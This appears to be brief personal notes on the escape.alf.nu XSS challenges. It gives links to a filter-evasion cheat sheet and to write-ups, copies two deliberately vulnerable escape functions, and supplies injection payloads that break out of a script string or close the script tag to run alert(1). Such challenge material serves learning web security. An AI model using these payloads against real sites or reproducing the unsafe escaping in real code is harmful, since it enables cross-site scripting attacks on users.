http://blog.7ell.me/2016/11/06/%E8%BD%AC-XSS-Filter-Evasion-Cheat-Sheet/
http://blog.spoock.com/2016/03/10/escape-alf-nu-xss-challenges-writeups/
function escape(s) {
	//Warmup.
	return '<script>console.log("'+s+'")</script>';
}

escape('");alert(1)//')
"<script>console.log("");alert(1)//")</script>"


function escape(s) {
	// Escaping scheme courtesy of Adobe Systems, Inc.
	s = s.replace(/"/g, '\\"');
	return '<script>console.log("' + s + '");</script>';
}
</script><script>alert(1)<!--







